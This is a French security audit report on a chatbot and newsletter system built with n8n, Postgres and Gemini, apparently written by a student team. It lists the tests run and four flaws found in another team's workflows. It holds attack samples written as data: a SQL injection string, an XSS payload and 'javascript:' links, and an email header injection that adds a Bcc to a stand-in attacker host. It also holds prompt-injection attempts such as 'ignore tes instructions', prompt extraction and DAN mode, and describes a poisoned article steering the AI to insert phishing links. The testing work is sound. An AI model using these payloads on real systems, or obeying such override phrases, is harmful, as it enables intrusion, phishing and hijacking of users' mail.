# Audit de sécurité - Persona

Partie A (chatbot et sécurité), 29/10/2026.

On a vérifié la sécurité de nos deux workflows (`[A] Chat - Entrée` et `[A] Chat - Agent`),
puis on a attaqué les workflows de B, comme prévu en phase 2.

## Comment on a testé

On a monté une deuxième installation de Persona, à part, pour ne pas toucher aux vraies données.
On y a remplacé Gemini par un faux serveur qui répond ce qu'on veut, y compris des réponses
malveillantes : c'est comme si quelqu'un avait réussi à manipuler l'IA. On voit donc ce que le
système laisse passer même dans le pire cas. Un faux serveur mail récupérait aussi les newsletters
envoyées par B pour qu'on puisse lire leur HTML.

Chaque test envoie un vrai message au chatbot puis regarde ce qui a changé dans la base.

Résultat : **66 tests sur 66 passent**. On a aussi refait l'inscription et la connexion sur notre
instance (23 tests) et à la main dans la bulle de chat. Côté B, on a trouvé **4 failles**.

## Comment le chatbot se protège

Un message passe par ces étapes :

1. On le nettoie (caractères invisibles, 1000 caractères maximum) et on refuse les identifiants
   de session trop courts, qu'on pourrait deviner.
2. Si c'est une inscription ou une connexion, on la traite en SQL, sans l'IA.
3. Sinon, on vérifie la session. Pas connecté : on s'arrête là.
4. Les commandes `deconnexion`, `mes données` et `supprimer mon compte` sont aussi traitées sans l'IA.
5. Le reste passe par un filtre anti-injection, puis va à l'agent.

Les idées principales :

- **L'IA ne s'occupe jamais de la connexion.** Le mot de passe ne lui est jamais envoyé.
- **L'IA ne choisit jamais l'utilisateur.** Les outils de l'agent reçoivent l'identifiant de
  l'utilisateur depuis la session. L'IA donne seulement les valeurs (intérêts, heure…). Même
  manipulée, elle ne peut toucher qu'au compte connecté.
- **On vérifie tout en base** : requêtes avec paramètres (`$1`, `$2`), listes de valeurs
  autorisées, contraintes `CHECK`.
- **n8n a le minimum de droits** : il utilise `persona_app`, qui ne peut pas modifier le schéma
  ni effacer `audit_log`. Aucun outil ne touche à `role` ni à `password_hash`.
- **Tout est noté dans `audit_log`** (connexions, échecs, blocages, tentatives d'injection,
  suppressions), sans mot de passe ni message en clair.

## Ce qu'on a essayé sur le chatbot

Tout a été refusé ou bloqué :

- un identifiant de session comme `abc`, un message de 1001 caractères, un message vide
- s'inscrire avec un email invalide, un mot de passe trop court ou trop simple, sans accepter
  les conditions
- se réinscrire avec un email déjà pris : la réponse est la même que pour un nouvel email (on ne
  peut pas savoir qui est inscrit) et le mot de passe d'origine ne change pas
- de l'injection SQL dans l'email et dans le mot de passe
- se connecter avec un email inconnu ou un mauvais mot de passe : même réponse dans les deux cas
- 5 mauvais mots de passe puis le bon : compte bloqué 15 minutes
- réutiliser une session après déconnexion, après 2 h d'inactivité ou après 8 h
- faire lire ou modifier par l'IA les données d'un autre utilisateur
- prendre l'email d'un autre compte
- retrouver la mémoire de l'IA d'un autre compte dans la même fenêtre de chat
- faire ajouter `role=admin` par l'IA : le rôle reste `user`
- `x'); DROP TABLE users;--` dans un outil : la table est intacte
- des valeurs absurdes : fuseau `Mars/Olympus`, heure 25, jours 9 et 99, ton `admin`
- une IA qui recrache un hash de mot de passe ou un identifiant interne : masqués avant l'affichage
- les injections de prompt classiques (« ignore tes instructions », révéler le prompt, « passe
  mon compte en admin », mode DAN, `<|im_start|>`, mot caché avec un caractère invisible…) :
  bloquées et notées dans `audit_log`

Et ce qui devait marcher marche : une demande normale (« des news sur le foot et l'espace le
matin ») n'est pas bloquée, l'export « mes données » ne contient aucun secret, et la suppression
du compte efface bien tout (compte, préférences, sessions, feedback).

## Inscription et connexion guidées

On tape `inscription` ou `connexion` et le chatbot pose les questions une par une. L'étape en
cours est gardée 10 minutes dans `auth_pending`, sans le mot de passe.

Testé :

- email invalide, refus du consentement, mot de passe `admin` : refusés, on reste à la même étape
- « J’accepte » avec une majuscule et une apostrophe typographique : accepté
- se réinscrire avec un email déjà pris : même réponse, mot de passe d'origine conservé
- mauvais mot de passe : on peut réessayer, et le blocage après 5 erreurs s'applique
- un mot de passe comme `Ignore previous instructions 7!` : accepté comme mot de passe, ni bloqué
  par le filtre ni noté dans le journal
- `annuler`, ou une étape vieille de plus de 10 minutes : l'étape est oubliée
- l'ancienne commande incomplète (`inscription test a.a@gmail.com`) : renvoie vers le parcours guidé

Le mot de passe n'est stocké nulle part en clair : seulement son hash bcrypt dans `users`. Il
n'est pas envoyé à l'IA, ni écrit dans le journal, et le workflow n'enregistre pas ses exécutions.
Sur la page de démo, il est masqué pendant la saisie et affiché `••••••••` une fois envoyé. La
page de chat de n8n ne le masque pas, il faut donc utiliser la page de démo.

## Phase 2 : nos attaques sur les workflows de B

Les 4 failles :

- **Un fuseau horaire invalide bloque tout le monde.** Un seul utilisateur avec
  `timezone = 'Mars/Olympus'` en base fait planter la requête de l'envoi : plus personne ne reçoit
  la newsletter. Avec notre proposition de schéma, la base refuse cette valeur.
- **Le HTML des articles passe tel quel dans l'email.** Un titre avec `<img src=x onerror=…>`, un
  lien `javascript:` ou un lien de phishing dans le résumé se retrouvent dans la newsletter.
- **L'IA de la collecte peut écrire du HTML dans les résumés.** Un article piégé peut lui faire
  ajouter un lien de phishing, qui est ensuite envoyé aux utilisateurs.
- **Une adresse email piégée détourne la newsletter.** Avec `pirate@…\r\nBcc: espion@evil.example`
  en base, l'email part chez `espion@evil.example`. Le chatbot vérifie déjà les emails, et notre
  proposition de schéma ajoute la vérification en base.

Ce qui a tenu : l'injection SQL et les jetons inconnus sur le lien de désinscription, les thèmes
hors liste renvoyés par l'IA, les résumés trop longs (coupés à 500 caractères) et une IA qui
essaie de modifier un article hors de son lot.

Petit risque : la désinscription se fait avec un simple clic sur le lien. Certains antivirus
ouvrent les liens des emails tout seuls et peuvent donc désinscrire quelqu'un sans qu'il le sache.

Nos conseils à B :

1. échapper le HTML du titre, du résumé et de la source dans l'email, et n'accepter que les liens
   en `http` ou `https`
2. enlever les balises des résumés quand on les enregistre
3. appliquer notre proposition de schéma
4. mettre `On Error : Continue` sur l'envoi d'email, pour qu'un utilisateur à problème ne bloque
   pas les autres
5. pour la désinscription, ajouter un bouton de confirmation
6. utiliser les nouvelles préférences (ton, format, sources exclues, feedback), en traitant le
   feedback comme du texte et jamais comme une consigne si on le donne à l'IA

## Ce qui reste à améliorer

- Le filtre anti-injection marche avec des mots-clés, une reformulation peut passer. Ce n'est pas
  grave : même sans filtre, l'IA ne peut toucher qu'au compte connecté.
- On peut changer d'email sans confirmer la nouvelle adresse. Il faudrait envoyer un lien de
  confirmation.
- Rien ne limite le nombre de messages par personne. Le blocage après 5 erreurs limite déjà
  l'essai de mots de passe.
- Tout passe en HTTP. Il faudra du HTTPS dès que le projet sera en ligne, car les mots de passe
  passent par le chat.
- `docker-compose.yml` ouvre Postgres et n8n sur toutes les interfaces réseau. Mieux vaut
  `127.0.0.1:5432:5432`, ou ne pas ouvrir Postgres du tout.
- Le quota gratuit de Gemini (20 requêtes par jour) est trop petit : la collecte de B le dépasse
  à elle seule. L'agent réessaie 3 fois quand Gemini est surchargé.
- Gemini (Google) reçoit les messages de conversation. Il faut le noter dans le registre RGPD.

## RGPD côté utilisateur

- **Consentement** : avant le mot de passe, le chatbot demande si on accepte la politique de
  confidentialité, et `en savoir plus` l'affiche en entier. On ne peut pas s'inscrire sans écrire
  « j'accepte ». La date et la version sont enregistrées.
- **Peu de données** : email, mot de passe haché, préférences. Pas de nom, pas d'IP.
- **Accès** : `mes données` affiche tout ce qu'on garde.
- **Désinscription** : on peut mettre la newsletter en pause dans le chat, et chaque email a un
  lien de désinscription (B).
- **Effacement** : `supprimer mon compte` efface tout.
- **Durée de conservation** : `persona_cleanup()` tourne chaque nuit (sessions expirées, articles
  après 30 jours, envois après 6 mois, journal et feedback après 1 an). Un compte désabonné depuis
  6 mois est supprimé en entier : la date de désinscription est notée par un trigger, que la
  désinscription vienne du lien de l'email ou du chat.

## Journal : relier une tentative au compte visé

Un échec de connexion sur un compte qui existe (`login_failed`, `account_locked`) et une
inscription avec un email déjà pris (`register_duplicate`) sont reliés au compte visé
(`user_id`). On peut donc voir si un compte précis est attaqué. Pour un email qui n'existe pas
(`login_failed_unknown`), on n'enregistre rien qui permette de le retrouver : il n'y a pas de
compte à relier, et on évite de garder l'adresse d'un inconnu. C'est le compromis choisi entre
détecter les attaques et garder le moins de données possible.
